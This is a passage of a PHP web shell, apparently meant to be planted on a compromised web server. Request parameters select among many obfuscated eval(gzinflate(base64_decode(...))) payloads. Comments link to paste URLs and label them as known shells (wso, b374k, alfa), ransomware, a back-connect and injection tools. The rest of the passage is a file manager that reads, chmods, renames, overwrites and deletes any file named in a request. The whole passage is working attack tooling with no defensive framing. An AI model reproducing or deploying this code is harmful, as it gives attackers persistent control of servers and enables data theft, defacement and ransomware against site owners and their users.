eval(gzinflate(base64_decode('1Vhtb+I4EP68J91/GHxIgNQrLei+bAlVtaVqdXdbVNirVqsKmcRA1BDnHIeWW/W/3zhxghNeAm2lveMDYHs883g8z8wk7qQeSiF5FARM1MNojKN6/7o/uh0cwckRtBsNsCwLavc3n2sN+A7n3Y7NfMlEtzMWzeTr558+xJ+O4y7AdSxic5Tw5a8em0iSLaPAhIs5UFu63LcIgTmTM47y/dvBMCcn6dhjMObCYcIip8Ez0QObexxnfrmKPwRs5nkBdRzXn1rkN5QztKAaYQ5x7AAqCAOK1tsEqOdO8V9yHrQwXWlv9U5OSBfx+hJC9x9mkZZS/kkwKhncXfY7TenkbDXzxjbYTtR1v4RM+HTO4CMkEx3XDyIJchmgGcmeJQFQAhaJtCiBwKM2m3Ev9seXbFqwvyNXMFT9ajh9GoZP6FsFp1mCJ9CyBTz9bPoteHZcTR7SzHUc5hON6TGcYQwQWFAvwuFpQRhDeu7KVDgdpdLJfVZIGV4cqojMzahYzk1g9JtjkxnvyI03kQNBFdyeH78DRW4DdYKiP9cCYKPpDQzZGpLJhYoyiiQ3e4j1vQiRWJ9SX7rB0zY6HG77Ir7+leWc2IdOyDxmS22cPoYugYIICvH4Agw+DGb8CVKHdJrJetm+FuleojVMdofubGOanFF/yiB1xJadnWZynoIz9qZ66yCq956ZHW3kehycZdFazF97JIRcadTZoXMezAIAd1KvjhSzv9USnLUHVVyN6eSstQdLXaFaq4qRinWwIBVJQ7/2cKZWVXI2VtNcHa/ac2dks8dUQ6x7xNAjdeIzCWqaNM6U/UCw6WhOpT2rk6a22SRHeRWNxndg9oxDdUqXdCQ4l8da9ljlDMyqzhLogrqe8hI5rvIzeGFeyNRBlCbMSrvAADH0xf/VcfB/EzcqpJmSqcDeJTzdoMfjNvXiZbhw5q7vYmtDJRdhTvkWha0DFO6jr723PhZtVqhiw/TchisgRjJudS8cJ+YuZhNTn5HeTMcm+WcQ2TYLw0qa+PRP1unlb/L97V9hxDCnss1uYjFvpi+4gow1LrYWHkHfYxTx3VNXAgV0LNL++DjRk/ejDp5SV37i/hSvJvKoSmNhJTmXeaqcuPbiJPK8JWh8O04Ve3MdVuu/Cav9XrBehafM9oALsdxmUEVXJBhInpo7KNIGTCxQ740/4UZvoMOqBFa89aafBP1o0Lv7q3f3jVwPh/3RtWrwHnCDCcXcnLVDeSZtlc8YtkK5YlqVF3aa+POgh1jFHwGrGqZkRS+k06adL8pbaaysV69WXL20+lAuc0VT9QDxlCam3q5am7T0ZXuxMuE5tpWudQyZkgRBNS2XRo0UuRK6d5GEeoXNA7msZzpVQVwrnunixvK5bxVMlahKcNn7ozfs7SoG21JjLiliLsyuEZr6uzSE11h9x+Z8kbSHkAWGuSOP3pRIqQ+VyiYoB/D9K6Mz+Fh/ExhddHZA2bfiYW75yiP43Y2fueBPdl7J2mcjZeRwgQEMCsjgRsIlZyF85hJ6z9ggoMfgzTjTYOiphzqQMwZXrkDdGVRMkE7S/JeY20669jrtweC9uqSM+eXUTJtZQ0A/e/0fmPuq9k0/Q6nbye4l3zsZ8Ux9p7CYeqxYbd9OOQ1sDVQRk0P9EkyQvEzQ7xJ+DA9rOxmoNRaAprT0aytW/jBSYpOuX8iuWPmScTOj4FgkwunLW8P/NX2uWnfIuReCTX0f882YqVB2jmIsCGLh2kj1ENTaves7/Ml4TkghKPv/Ag==')));
} elseif($_GET['s3nd4l'] == 'bcon') {
eval(gzinflate(base64_decode('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')));
} elseif($_GET['s3nd4l'] == 'info') {
// https://ghostbin.co/paste/zevkn/raw
eval(gzinflate(base64_decode('jZLba8IwGMXfB/sfPpgQC6MTH13ty+ZlMJnzwvBJtIltoO3X5TLp8I9fUqtMobZ9STg553dyKQsiBOLtMFUg+S/rd/15LhVLoAf/VQgwRtF/GA67g07HJ25L5tIl3lb43pP1nYb7u0sYEz9MwNu0lsczl1RY7OcfyoJbnhXqU1e5qZrKRDc5w2bHYIKU1d9J0gD3yuVmGzMKQ50GimMq67kR7te0yX2PMWEwQ1S1zMg416IBcsEN8iOF8ilP3Gsg3SjWJhQmsIJxj/ckeVQm2XYc03HBt41XHUt5g9zSZvUMgbZVOHWJAwcYCdRZdTK0y5fRsIhWb2WSzz/fDdFYk1x+x+avPMCUifioZWZ2lHIVYVqKxbyQv0aDxVHch0wV0styVgIDbcO2lDz/AQ==')));
} elseif($_GET['d'] == 'files') {
eval(gzinflate(base64_decode("lVLBjpswFDxTqf/wSiM5kVaQVt1LCNyaS1Vtpe5tFUUOmGCtsRE2m6yq/HttY4iTTdM2UsBm5s08z3PZ8VxRwaHCTSc3NZYSs+mkoO3dhOMal5SRGfx6/y4IaDmlcrNvqcJbRixn5qDAbDCkIHPM9bIHEwuVoiU4r6Y9BUswi+1QaCtzXRmaRWyxMHEQE89YUg1aUoRiFI1NOY5uytZAmqaAIjTqGsTwNuRApZJTpz+Uh7MTM+g4o/z5LcV5BMf+fQTCJLlwvGUZRpqo5VxYUfgX/5v8q8341no4Q/S5r35lbmf4Zdsu9jNKQPJKQLgsBVeQCyba9ONq9fnrfJ49LWPzNbvAzC97+HYdtIXrG4Wuh4GxbbPhUnh5DY16yKTEhb4vby5z7t3mE/04rI4X2dqXfZqH+Zupb348/Hx8QlLhVqG1i8cFU9AXkOqVkRTVuN1RvoD75gC4UyKBBhcF5Tv7CbmTnLfopAszQbS+g9MH07I2SzyvWJv1Kt4lcFhOuCIurXFmbQ01UZUoUtQIqVCmQZt6thKsIO3Cy9lAlDedAvXa6NMoclAIzKVMXXvwglmndxO7cYfe00JVC/hyP28OCYKK0F2lUvRpjkbV3lAfx4j9u6UNYPBs9jyqVP0/tr6y7LY1HbX7QQ7S3/UoPvxB2ArFJshsGfsRH38D")));
} elseif($_GET['s3nd4l'] == 'rans') {
// https://ghostbin.co/paste/6v2jkv/raw
eval(gzinflate(base64_decode('vVLBauMwED1nof8wmIAdcKtDe8o6hnZxIBCyxUkLPRlFHdXqKpKRxqRQ+u+VY4emsIXuZQ9C0rx5b96MJFsjSFkDjhtvd8m4dTqFsfJqAq9nP0ajsWxgBtI2aJIunEK0jyY/D5CoAyQCo1JGUdJHYQR9zCPZhpKQlcKvu3L5+3ZThS2oB/QbuTeL1XX5sCmvV+t5UaZArsVv0Mpic1eu/pm2Xi+r+6JczB9ui44mufZHHsDoS958sSxCS7Lpcx1S60xfBl9QdMk9cggJbT1+xORwP7LttpK69fUwypPzW1hKJlJpDLrKk0/i/skumrqJJ8NroagtRJlAQ+jyTFpDecahdihn8Vi2WrMTFhB3T0izuNpqbv7EeZ5DeYD33CFkWcZ4nrFehQ2i0cEOYBhPXzPYGj5PVBM1fsrYkyLNtxfC7pi/NI9XunrGRtGny/kufBpfY7B0Hkzt2Y77oM+6Fv3RJb1QlEYflqNjo/+t00+t/rXqnAfHj0AWhENOeCo8Tb4Q7Wb4Dg==')));
} elseif($_GET['s3nd4l'] == 'dlog') {
// https://ghostbin.co/paste/hwa32h/raw
eval(gzinflate(base64_decode('rZdBT8IwFMfPmvgdKjEBD9LoFeSkRhJvevFkyngwQkeXtkPx07upI1vb13bTq/2993u0/7QTklSQwTSXMBtMzk5P4AOS0UBm5EquCNVZTrlYq8GlvSaF0HS8VelbulFayAMOLVg0VdpEoV1QoWQ5S8I4ZTlLUkAHc4Eubs9kqFUbwQhZ7GhRbhW27uvum22ZuZZAJ/QdsVVryCQXj/Pnl4f5071nEsqZ0p6JKuSoLgmVAudvvsi4CCQ4OGrHJ8A2Q+RCPVGKxXHaGasw6OfaEcOosC88eR06F9COHkZ45zRi6JmzHUYf2IxkzpTSqSywQNrrSBwx0A6jl2xG0QY9QYyDMdYZwhDmo9oBdDMhU2jeOnr2cjt47nXPdEbo0OnakcOxRuCqaB6Uhgy9ATlAPrr+uVHLx3Y4XYmdJmrzCbc3szvgoDe7NRmPx8dCMqUVM5su5Gxo9HD40Esy3my3MGdAvfY93lW77WG1r/leP/anQ4TV92LEm51detr/RR7hdj9n8VqjvrPxj8JIn/G+drPVxZGu3tvYYf/6blyHTBw/FDoezTKLMBhfGvGKujDS0evM68Kww/zaiXYcC9sO4jtw44Op88HX9fER63dEzWKX67vTze9jZ/d6FYUkWrIEFEnZHsgCYEdUkZR/UKuC8wNZVjpYkpUUGdEpEAVyD/K8ltHq393h5As=')));
} elseif($_POST['S3nd4l_Jepit'] == 'ets') {
// https://ghostbin.co/pa8ste/22otcb/raw
eval(gzinflate(base64_decode('vVLRatswFH3OoP9wMQE74FYP61PnGLrhQCBkxUkHfTKKelVrU2QjXS+F0X/vdZzQBFboXvZgZN17zrnnSNKdU2QaB0ghGXfepjA2wUzgz8Wn0WisW5iCblp0SV9OIdpFky/7lqq5pZhRGWcoGaowgqEWkJqWEkal8O2+XHy/W1e8sDp3P4D9Ol/elg/r8na5mhVlCuQ7/ACtLNb35fKfaavVovpRlPPZw13R07S04cgDGL3Lm80XBUfS7YD1SJ13wxh8RtWDh86+pGwT8K2mD/sju9lU2nahPhzlyf8Lf0Yn2lhkXRP4qmL8bSztjLtq6zaeHO4LVd1AlCl0hD7PdOMozyTUHvU0HuvOWnHGA5L+CWkaVxsr3a84z3MoGABrRkCWZULmmRhkxEE12jsC5BMahrKz/vFENVEbboR4MmTl5ko1WxE+u8drW/3E1tDZ5nLLjybUyIYuhZc7sZWBxUUfMbx5pGeK0ujUcnSM+v+ynoX969iZZNuPQA0oj5LwRHfVZ4Sb5B3l/ihfAQ==')));
} elseif($_POST['S3nd4l_Jepit'] == 'idx') {
// https://ghostbin.co/paste/co46ww/raw
eval(gzinflate(base64_decode('vVJRa9swEH7OYP/hMAE74FYP21PnGLrhQCBkxUnH+mQU5VRrUyQhnWlg7L9Pjh3awgrtSx+EpLv7vvu+k2RnBClrQO2P2bTzOoepCmoGfz5+mEym0sEcpHVosj6cQ/KQzL6cUqKNKRERjTKKsiEKExhiAck6ymJVDt9u69X3m20Tt8ges6+o/bpcX9d32/p6vVlUdQ7kO3wFrK62t/X6zbDNZtX8qOrl4u6m6mGS63DGAUxexC2Wqypakm6o9UidN0MbPKLoi4fMKSS0DfgYk+P9jLa7RuoutOMon5z/xqVkJpXGyKsChSyN73XpWpfOxqdC0VpICoGG0JeFtIbKgkPrUc7Tqey0ZmcIEPf3SPO02WlufqdlWcLS7O1Pp60iKIqC8bJgAwUbGZOTEMA4mKFhFNT/maQlcuGKsXtFmu8uhT2w8MnsP+vmFzpFzy4Xh/hXQotRzAXz/IEdeIjkrHcWTvroSEmejEqTs7n3cffM3n9bLngUugeyIDxywqfEm94WXGUvUPfT+wc=')));
} elseif($_POST['S3nd4l_Jepit'] == 'wso') {
// https://ghostbin.co/paste/y23s/raw
eval(gzinflate(base64_decode('tVJNa9wwED1vof9hMAv2ghMd2lPqNaTFCwvLJtiblJyMVhnFSrSSkcZsoPS/V/5YkkAD6aEHIWlm3pv3RpKdEaSsgaO3ybxzOoW58moBvz5/ms3msoUlSNuiSfpwCtExWnwbUqIJKREQtTKKkjEKMxhjHsm2lISqFH7clJur610dtsAesh+o/b7eXpZ3u/JyW62KMgVyHX4AVha7m3L7z7Cq2tS3Rble3V0XPUxy7U84gNm7uNV6UwRLsh1rHVLnzNgGn1H0xWNmCAltPb7E5HQ/oe2+lrrzzTTKV+ffYSmZSKUx8CpPPonDe523TRsvpqdC0ViIMoGG0OWZtIbyjEPjUC7juey0ZicIEHcPSMu43mtunuI8z+FndQVZljGeZ2zEsokqGhQAhomMnYKS/rNEDVHrLxh7UKT5/lzYA/NfzP1XXT9iq+jN5ewQPolvMKg4Y44f2YH7QM56S34QRs8UpdEkMTq5+s+23vj6a68VDwrvgSwIh5xwYKx6I3CRvMPZz+sP')));
} elseif($_POST['S3nd4l_Jepit'] == 'b374k') {
// https://ghostbin.co/paste/7o2v6/raw
eval(gzinflate(base64_decode('pVJRa9swEH7OYP/hMAE74FYPLRQ6x9AOBwIhLU5a6JOR1VOtVZGMdKaF0f8+OXbWFVrWsQch6e6+777vJNkZQcoaqE/OTh+Taed0ClPl1Qx+fv0ymUxlC3OQtkWT9OEUoqdo9m2fEk1IiYColFGUDFGYwBDzSLalJFSl8P2mXF1db6uwBfaQ/UTt5XJ9Ud5ty4v1ZlGUKZDr8BOwstjelOt/hm02q+q2KJeLu+uih0mu/QEHMPkQt1iuimBJtkOtQ+qcGdrgM4q+eMjsQ0Jbj68xOd4PaFtXUne+GUf5x/klLCUTqTQGXuXJJ/H+xY7bpo1n42OhaCxEmUBD6PJMWkN5xqFxKOfxVHZas1cQEHcPSPO4qjU3j3Ge53DZZyHLMsbzjA14NtJFex2AYS5Dt6Bn+DRRQ9T6c8YeFGleHwu7Y/7E3J/q6ge2it5cjnbhs/gGg5Yj5vgT23Ef6FlvzY/y6JmiNPotNTr4+3+D9d8MvnH4br8FD0rvgSwIh5xwHNqmtwTnyQes/ex+AQ==')));
} elseif($_POST['S3nd4l_Jepit'] == 'mrjn') {
// https://ghostbin.co/paste/r7qk/raw
eval(gzinflate(base64_decode('vVJRa9swEH7OYP/hMAE74FYP21PnGLzhQEaWFScp9Mko6qlWp0hGOtPC2H+vHCdrAi10L3sQku7u++77TpKdEaSsgR136qHjhifjzukUxsqrCfz++GE0GssWpiBtiybpwylEj9Hkyz4lmpASAVEroygZojCCIeaRbEtJqErh26Za/Lxe12EL7CH7jtqv82VR3a6rYrmalVUK5Dp8B6wq15tq+c+w1WpR35TVfHZ7XfYwybU/4gBGb+Jm80UZLMl2qHVInTNDG3xC0RcPmX1IaOvxJSYP9yPabmupO98cRnly/hOWkolUGgOv8uST+O+rXbZNG08OD4aisRBlAg2hyzNpDeUZh8ahnMZj2WnNzoFA3N0jTeN6q7n5Fed5Dj+Kav59UywLyLKM8TxjAw870EZ7TYBhRkPXoO3lE0UNUeuvGLtXpPn2Utgd85/M3WddP2Cr6OxysQufxzcYdF0wxx+DOh9asN6qP5FKTxSl0Zn06Oj5P5o+c/1q3xkPyu+ALAiHnPCEd9XbhKvkDeZ+ps8=')));
} elseif($_POST['S3nd4l_Jepit'] == 'alfa') {
// https://ghostbin.co/paste/3uado8s/raw
eval(gzinflate(base64_decode('tVJRa9swEH7OYP/hMAE74FYP21PrGNJhQyCkxUkHfTKKeqrVKpKRzrQw9t8nR8m2Qgvdwx6EpLv7vvu+k+RgBClrgGvJs+ngdA5T5dUMfnz+NJlMZQ9zkLZHk43hHJLnZHZ5SIkupERAtMooymIUJhBjHsn2lIWqHL7dNqvrm20btsAesh+ovVquF83dtlmsN3XV5EBuwA/Ammp726z/GbbZrNrvVbOs726qESa59iccwORdXL1cVcGS7GOtQxqciW3wBcVYHDOHkNDW45+YPN5PaLtrpR58dxzlX+efYSmZSaUx8CpPPkvHBzvvuz6dHd8KRWchKQQaQlcW0hoqCw6dQzlPp3LQmv3GAHH3gDRP253m5iktyxIWq3oBRVEwXhYsotmRLDmIAAxDib2CmMOHSTqi3l8w9qBI8925sHvmv5j7r7p9xF7Rq8vZPnwU32EQcsYcf2Z77gM7G235qI1eKMmTk8zkZO2/e3tl7s1uNQ8q74EsCIecMFJuRjdwkb1DOk7tFw==')));
} elseif($_POST['S3nd4l_Jepit'] == 'inj') {
// https://ghostbin.co/paste/vqu2e
eval(gzinflate(base64_decode('vVJRSyMxEH6u4H8YlsJuYTWIB4JuFzzZQqFU2VbBpyWNEzdemizJLArH/Xez3fZsQcF7uYeQZGa+b75vEtkaQcoaUOYlGbZOpzBUXo3g9/HRYDCUDYxB2gZN0oVTiF6j0dUmJeqQEgFRKaMo6aMwgD7mkWxDSahK4ea+nN3eLauwBfaQ/Ubtz+n8unxcltfzxaQoUyDX4jdgZbG8L+f/DFssZtVDUU4nj3dFB5Nc+x0OYPAlbjKdFcGSbPpah9Q607fBNxRdcZ/ZhIS2Hj9icnvfoe2qkrr19XaUe+c/YSmZSKUx8CpPPonPzMX55uVOm7qJR9sHQ1FbiDKBhtDlmbSG8oxD7VCO46FstWaHQCDunpHGcbXS3PyK8zyHvxWQZRnjecZ6HraljTaaAMOM+q5BW/d9opqo8ZeMPSvSfHUq7Jr5c/P0Q1cv2Cg6uJysw7fxNQZFJ8zxV7bmPpCzzqTfE0lvFKXRgeho5/Y/2j3w+2nfCQ/Kn4AsCIeccI930dmEy+QL5m6a7w==')));
} elseif($_POST['S3nd4l_Jepit'] == 'nnme') {
// https://ghostbin.co/paste/qa67/raw
eval(gzinflate(base64_decode('vVLBauMwED2nsP8wmIAdcKvD7ql1DN3iQCB4i5MWejKKOqq1q0hGGtPCsv++cmzTFlpoLz0ISTPz3rw3kuyMIGUNGGv4AZN553QKc+XVAv5+O5nN5rKFJUjbokn6cArRY7S4OKZEE1IiIGplFCVDFGYwxDySbSkJVSlc3VSbX9e7OmyBPWQ/UPtzXV5Wd7vqstyuiioFch1+AFYVu5uq/DRsu93Ut0W1Xt1dFz1Mcu0nHMDsXdxqvSmCJdkOtQ6pc2Zog08o+uIhcwwJbT0+x+R4n9B2X0vd+WYc5Yvzv7CUTKTSGHiVJ5/Ew5OdtU0bL8bXQtFYiDKBhtDlmbSG8oxD41Au47nstGYvUEDcPSAt43qvufkT53kOpS1DGrIsYzzP2MDARsLoKAUwjGboFySNHydqiFp/ztiDIs33Z8IemP9u7n/o+je2il5dTg/hw/gGg5xT5vgjO3Af+Flvz08K6YmiNHqWG00mv8TlK5tvdlzxoPYeyIJwyAkn0m3vC86Td2j7Cf4H')));
}
echo '</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#FFFFFF">Successfully changed permissions!</font><br/>';
}else{
echo '<font color="#FF2E00">Failed to change permissions :(</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="#FFFFFF">Rename success!</font><br/>';
}else{
echo '<font color="#FF2E00">Rename failed :(</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New name: <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Save!" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="#FFFFFF">Successfully edited!</font><br/>';
}else{
echo '<font color="#FF2E00">Failed to edit :(</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="#FFFFFF">Dir deleted!</font><br/>';
}else{
echo '<font color="#FF2E00">Failed to delete dir :(</font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
